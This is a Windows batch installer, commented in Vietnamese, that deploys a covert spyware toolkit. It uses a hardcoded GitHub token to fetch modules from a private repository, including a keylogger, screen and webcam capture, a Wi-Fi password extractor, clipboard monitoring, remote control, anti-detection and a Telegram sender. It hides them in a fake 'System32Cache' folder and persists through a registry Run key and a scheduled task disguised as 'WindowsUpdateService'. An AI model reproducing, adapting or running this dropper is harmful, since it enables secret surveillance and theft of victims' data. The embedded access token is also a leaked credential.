@echo off
REM ========================================
REM INSTALLER TỰ ĐỘNG - REPO PRIVATE
REM ========================================
REM File này sẽ tự động:
REM 1. Tải tất cả file từ GitHub Private Repo
REM 2. Cài đặt thư viện Python
REM 3. Ẩn thư mục và file
REM 4. Thêm vào Windows Startup
REM 5. Khởi động ứng dụng
REM ========================================

REM Chạy bình thường - hiển thị thông báo
chcp 65001 >nul 2>&1
cls
echo ========================================
echo    CAI DAT TU DONG
echo ========================================
echo.

REM ========================================
REM CẤU HÌNH GITHUB - THAY ĐỔI Ở ĐÂY
REM ========================================
set "GITHUB_USER=truongxoantit"
set "GITHUB_REPO=TLe1"
set "GITHUB_TOKEN=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"
REM ========================================

REM Kiểm tra Python
echo [CHECK] Dang kiem tra Python...
python --version >nul 2>&1
if errorlevel 1 (
    py --version >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] Python chua duoc cai dat!
        echo Vui long cai dat Python tu https://www.python.org/downloads/
        echo.
        pause
        exit /b 1
    ) else (
        set "PYTHON_CMD=py"
    )
) else (
    set "PYTHON_CMD=python"
)
echo [OK] Tim thay Python: %PYTHON_CMD%
echo.

REM Tạo thư mục cài đặt
set "INSTALL_DIR=%APPDATA%\Microsoft\Windows\System32Cache"
echo [SETUP] Thu muc cai dat: %INSTALL_DIR%
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%"
    echo [OK] Da tao thu muc
)
if not exist "%INSTALL_DIR%\temp" (
    mkdir "%INSTALL_DIR%\temp"
)
cd /d "%INSTALL_DIR%"
echo [OK] Da chuyen den thu muc cai dat
echo.

REM Kiểm tra curl
echo [CHECK] Dang kiem tra curl...
curl --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Curl chua duoc cai dat!
    echo Windows 10/11 co san curl, neu khong co vui long cai dat.
    pause
    exit /b 1
)
echo [OK] Curl da san sang
echo.

REM Kiểm tra quyền admin
net session >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Khong co quyền Administrator
    echo Mot so chuc nang co the khong hoat dong.
    echo.
)

REM Tải tất cả file từ GitHub Private Repo
echo [1/5] Dang tai file tu GitHub...
echo.

REM Xóa file cũ nếu có (để tránh permission denied)
if exist "main_stealth.py" (
    attrib -h -s "main_stealth.py" >nul 2>&1
    del /f /q "main_stealth.py" >nul 2>&1
)
if exist "config.py" (
    attrib -h -s "config.py" >nul 2>&1
    del /f /q "config.py" >nul 2>&1
)

REM Tải từng file một cách rõ ràng
echo Dang tai main_stealth.py...
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "main_stealth.py.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/main_stealth.py" 2>nul
if errorlevel 1 (
    echo [ERROR] Khong the tai main_stealth.py!
    echo Kiem tra lai GITHUB_TOKEN hoac ket noi internet.
    pause
    exit /b 1
)
if not exist "main_stealth.py.tmp" (
    echo [ERROR] File main_stealth.py khong ton tai sau khi tai!
    pause
    exit /b 1
)
REM Đổi tên file tạm thành file chính
move /y "main_stealth.py.tmp" "main_stealth.py" >nul 2>&1
if not exist "main_stealth.py" (
    echo [ERROR] Khong the tao file main_stealth.py!
    pause
    exit /b 1
)
echo [OK] Da tai main_stealth.py

echo Dang tai config.py...
if exist "config.py" (
    attrib -h -s "config.py" >nul 2>&1
    del /f /q "config.py" >nul 2>&1
)
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "config.py.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/config.py" 2>nul
if exist "config.py.tmp" (
    move /y "config.py.tmp" "config.py" >nul 2>&1
)
if not exist "config.py" (
    echo [ERROR] Khong the tai config.py!
    pause
    exit /b 1
)
echo [OK] Da tai config.py

echo Dang tai requirements.txt...
if exist "requirements.txt" (
    del /f /q "requirements.txt" >nul 2>&1
)
curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "requirements.txt.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/requirements.txt" 2>nul
if exist "requirements.txt.tmp" (
    move /y "requirements.txt.tmp" "requirements.txt" >nul 2>&1
)
echo [OK] Da tai requirements.txt

echo Dang tai cac file module...
for %%f in (screen_recorder.py keylogger.py telegram_sender.py file_manager.py stealth.py hotkey_listener.py internet_checker.py performance_optimizer.py anti_detection.py updater.py data_manager.py clipboard_monitor.py screenshot_capture.py file_collector.py process_monitor.py machine_id.py remote_control.py file_receiver.py wifi_extractor.py webcam_capture.py usb_monitor.py) do (
    if exist "%%f" (
        attrib -h -s "%%f" >nul 2>&1
        del /f /q "%%f" >nul 2>&1
    )
    curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "%%f.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/%%f" >nul 2>&1
    if exist "%%f.tmp" (
        move /y "%%f.tmp" "%%f" >nul 2>&1
    )
)

echo [OK] Da tai tat ca file
echo.

REM Cài đặt thư viện Python
echo [2/5] Dang cai dat thu vien Python...
echo Dang nang cap pip...
%PYTHON_CMD% -m pip install --upgrade pip --quiet --disable-pip-version-check
if errorlevel 1 (
    echo [WARNING] Khong the nang cap pip, tiep tuc...
)
echo Dang cai dat thu vien tu requirements.txt...
%PYTHON_CMD% -m pip install -r requirements.txt --quiet --disable-pip-version-check
if errorlevel 1 (
    echo [WARNING] Co loi khi cai dat thu vien, nhung se tiep tuc...
)
echo [OK] Da cai dat thu vien
echo.

REM Ẩn thư mục và file
echo [3/5] Dang an thu muc va file...
attrib +h +s "%INSTALL_DIR%" >nul 2>&1
for %%f in ("%INSTALL_DIR%\*.py") do (
    attrib -r "%%f" >nul 2>&1
    attrib +h "%%f" >nul 2>&1
)
echo [OK] Da an thu muc va file
echo.

REM Thêm vào Windows Startup (Registry)
echo [4/5] Dang them vao Windows Startup...
%PYTHON_CMD% -c "import winreg; import sys; import os; install_dir = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'System32Cache'); key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE); winreg.SetValueEx(key, 'WindowsUpdateService', 0, winreg.REG_SZ, '\"' + sys.executable + '\" \"' + os.path.join(install_dir, 'main_stealth.py') + '\"'); winreg.CloseKey(key)"
if errorlevel 1 (
    echo [WARNING] Khong the them vao Registry, thu cach khac...
) else (
    echo [OK] Da them vao Registry
)

REM Tạo task scheduler (backup)
schtasks /create /tn "WindowsUpdateService" /tr "\"%INSTALL_DIR%\main_stealth.py\"" /sc onlogon /f /rl highest >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Khong the tao Task Scheduler
) else (
    echo [OK] Da tao Task Scheduler
)
echo.

REM Kiểm tra cài đặt thành công
echo [5/5] Dang kiem tra cai dat...
if not exist "%INSTALL_DIR%\main_stealth.py" (
    echo [ERROR] Khong tim thay main_stealth.py
    pause
    exit /b 1
)
if not exist "%INSTALL_DIR%\config.py" (
    echo [ERROR] Khong tim thay config.py
    pause
    exit /b 1
)
echo [OK] Tat ca file da duoc tai
echo.

REM Khởi động ứng dụng
echo Dang khoi dong ung dung...
REM Dừng process cũ nếu có
tasklist /FI "IMAGENAME eq pythonw.exe" 2>nul | find /I "pythonw.exe" >nul
if not errorlevel 1 (
    echo [INFO] Tim thay process pythonw.exe cu, dang dong...
    taskkill /F /IM pythonw.exe >nul 2>&1
    timeout /t 2 >nul 2>&1
)
tasklist /FI "IMAGENAME eq python.exe" 2>nul | find /I "python.exe" >nul
if not errorlevel 1 (
    REM Kiểm tra xem có phải process của ứng dụng không
    for /f "tokens=2" %%a in ('tasklist /FI "IMAGENAME eq python.exe" /FO LIST ^| findstr /C:"PID:"') do (
        wmic process where "ProcessId=%%a" get CommandLine 2>nul | findstr /C:"main_stealth.py" >nul
        if not errorlevel 1 (
            echo [INFO] Tim thay process python.exe cu, dang dong...
            taskkill /F /PID %%a >nul 2>&1
            timeout /t 2 >nul 2>&1
        )
    )
)

REM Tạo thư mục temp nếu chưa có
if not exist "%INSTALL_DIR%\temp" (
    mkdir "%INSTALL_DIR%\temp" >nul 2>&1
)

REM Khởi động mới - thử pythonw trước
echo Dang khoi dong pythonw...
cd /d "%INSTALL_DIR%"
start "" /min pythonw "main_stealth.py" 2>"%INSTALL_DIR%\temp\startup_error.log"
if errorlevel 1 (
    echo [WARNING] Khong the khoi dong bang pythonw, thu bang python...
    start "" /min %PYTHON_CMD% "main_stealth.py" 2>>"%INSTALL_DIR%\temp\startup_error.log"
    if errorlevel 1 (
        echo [ERROR] Khong the khoi dong ung dung!
        echo Kiem tra log: %INSTALL_DIR%\temp\startup_error.log
        echo.
        echo Thu chay thu cong de xem loi:
        echo %PYTHON_CMD% "%INSTALL_DIR%\main_stealth.py"
        goto :end_check
    )
)
timeout /t 5 >nul 2>&1

REM Kiểm tra process đang chạy
echo Dang kiem tra process...
tasklist /FI "IMAGENAME eq pythonw.exe" 2>nul | find /I "pythonw.exe" >nul
if not errorlevel 1 (
    echo [OK] Tim thay process pythonw.exe dang chay
    goto :process_ok
)

REM Kiểm tra python.exe với command line chứa main_stealth.py
for /f "tokens=2" %%a in ('tasklist /FI "IMAGENAME eq python.exe" /FO LIST ^| findstr /C:"PID:"') do (
    wmic process where "ProcessId=%%a" get CommandLine 2>nul | findstr /C:"main_stealth.py" >nul
    if not errorlevel 1 (
        echo [OK] Tim thay process python.exe dang chay (PID: %%a)
        goto :process_ok
    )
)

REM Kiểm tra log lỗi
if exist "%INSTALL_DIR%\temp\startup_error.log" (
    for %%f in ("%INSTALL_DIR%\temp\startup_error.log") do (
        if %%~zf GTR 0 (
            echo [WARNING] Co loi khi khoi dong, xem log:
            type "%INSTALL_DIR%\temp\startup_error.log"
        )
    )
)

REM Kiểm tra error.log
if exist "%INSTALL_DIR%\temp\error.log" (
    echo [INFO] Kiem tra error.log...
    powershell -Command "Get-Content '%INSTALL_DIR%\temp\error.log' -Tail 10 -Encoding UTF8" 2>nul
)

echo [WARNING] Khong tim thay process Python dang chay
echo Co the ung dung chua khoi dong hoac co loi.
echo.
echo Thu chay thu cong de xem loi:
echo %PYTHON_CMD% "%INSTALL_DIR%\main_stealth.py"
goto :end_check

:process_ok
echo [OK] Ung dung da duoc khoi dong thanh cong!

:end_check

echo.
echo ========================================
echo    CAI DAT HOAN TAT!
echo ========================================
echo.
echo Thu muc cai dat: %INSTALL_DIR%
echo Ung dung da duoc them vao Windows Startup
echo.
echo Kiem tra Telegram de xem thong bao ket noi tu may nay.
echo Neu khong thay thong bao sau 1 phut, co the ung dung gap loi.
echo.
echo Nhan phim bat ky de dong...
pause >nul

exit /b 0
